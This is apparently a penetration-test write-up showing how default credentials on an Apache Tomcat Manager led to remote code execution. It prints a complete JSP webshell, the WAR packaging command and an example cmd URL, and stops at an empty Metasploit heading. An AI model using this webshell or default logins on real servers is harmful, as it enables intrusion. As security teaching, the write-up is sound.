---
title: "Apache: From Default Creds to RCE"
date: 2026-7-06T00:00:00Z
tags: ["Bug"]
author: "Fernandez"
summary: "Click to read the full walkthrough."
---

Severity: ```Critical```

Type: ```Penetration Test Assessment```

CWE: ```CWE-640, CWE-287, CWE-306, CWE-209```

## Introduction
Default credentials remain one of the most consistently effective attack vectors in real-world assessments.
This is the story of how an unchanged default login on an Apache Tomcat Manager interface led directly to
full remote code execution and a reverse shell on the underlying server.
No fuzzing. No exploit chaining. No memory corruption. Just a login page that nobody bothered to lock
down.

## The Discovery
During reconnaissance, I identified an exposed Tomcat instance on port 8080. Apache Tomcat ships with
an optional Manager application that allows administrators to deploy, undeploy, and manage web
applications <b>(WAR files)</b> directly through a web interface, a powerful feature if it falls into the wrong
hands.

I navigated to <b>/manager/html</b> and was prompted for credentials. Rather than brute-forcing or guessing, I
tried Tomcat's well-known default credential pairs (such as <b>tomcat:tomcat, admin:admin,</b> or similar
vendor-default combinations).

The login succeeded. I was in.

<img width="937" height="529" alt="Screenshot 2026-10-28 093647" src="https://github.com/user-attachments/assets/d19c369b-2437-4944-9757-3676fea9464c" />
<h5><i>Figure 1 — Successful authentication to the Tomcat Web Application Manager ("Message: OK"), with the deployed
applications list visible.</h5></i>

## Why This Matters
The Tomcat Manager interface is explicitly designed to let an authenticated user upload and deploy a
<b>.war</b> (Web Application Archive) file to the server. A WAR file is just a packaged web application — and
Tomcat will happily execute whatever code is inside it, including JSP pages with arbitrary system
command execution. In other words, authenticated access to Manager is functionally equivalent to remote
code execution, by design

## Exploitation: Manual Path
With Manager access confirmed, I used a minimal JSP Webshell:
```
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

This simple page takes a ```cmd``` GET parameter, runs it with ```Runtime.getRuntime().exec()```, and prints
the output. Nothing fancy — just enough to prove command execution.

I created a directory named webshell on my machine using ```mkdir webshell```, and inside it I have my ```index.jsp``` file in it. 
I packaged it into a deployable WAR archive:
```
jar -cvf ../webshell.war *

```
Then used the Manager's WAR file to deploy upload form to push ```webshell.war``` directly to the server.
<img width="935" height="461" alt="Screenshot 2026-10-28 093850" src="https://github.com/user-attachments/assets/6cc51ed5-d38c-48d1-8168-5c58406cc713" />
<h5><i>Figure 2 — The Tomcat Manager Deploy form used to upload the WAR file, with Server Information confirming
Tomcat/JVM/OS details.</h5></i>

Tomcat auto-deployed it under the application path shown in the Manager's application list (```/webshell```),
confirmed as Running alongside the server's other deployed contexts.
<img width="928" height="399" alt="Screenshot 2026-10-28 093950" src="https://github.com/user-attachments/assets/d11c96df-b36d-4efa-8163-028bb081be99" />
<h5></i>Figure 3 — Updated application list showing /webshell deployed and running</h5></i>

Browsing to: ```http://<target>:8080/webshell/index.jsp?cmd=ifconfig```
returned live output from the host's network interfaces; ens160 with its assigned IP and MAC, loopback
stats, and packet counters — confirming arbitrary command execution on the underlying server, not just
the web application sandbox.

<img width="954" height="323" alt="Screenshot 2026-10-28 094148" src="https://github.com/user-attachments/assets/c3902f4d-79f2-4d48-b0c0-4305a9ffb175" />
<h5><i></i>Figure 4 — Webshell executing ifconfig via the deployed JSP, returning live network interface data from the host.</h5></i>

## Exploitation: Automated Path (Metasploit)




